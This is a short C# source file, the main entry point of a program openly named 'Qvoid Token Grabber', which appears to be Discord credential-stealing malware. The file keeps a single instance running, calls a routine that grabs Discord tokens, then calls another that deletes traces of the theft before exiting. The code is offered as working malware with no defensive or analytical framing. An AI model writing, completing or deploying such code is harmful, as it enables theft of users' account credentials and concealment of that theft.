using System;
using System.Threading;
using System.Globalization;
using System.Diagnostics;

namespace Qvoid_Token_Grabber
{
    static class Program
    {
        static void Main()
        {
            new Thread(() =>
            {
                Thread.CurrentThread.CurrentCulture = CultureInfo.InvariantCulture;
                Thread.CurrentThread.CurrentUICulture = CultureInfo.InvariantCulture;

                foreach (var proc in Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName))
                    if (proc.MainModule.FileName == Process.GetCurrentProcess().MainModule.FileName && proc.Id != Process.GetCurrentProcess().Id)
                        Environment.Exit(0);

                Discord.Grabber.Grab();
                Discord.Grabber.DeleteTraces(false, false);
                Environment.Exit(0);
            })
            .Start();

            Thread.Sleep(-1);
        }
    }
}
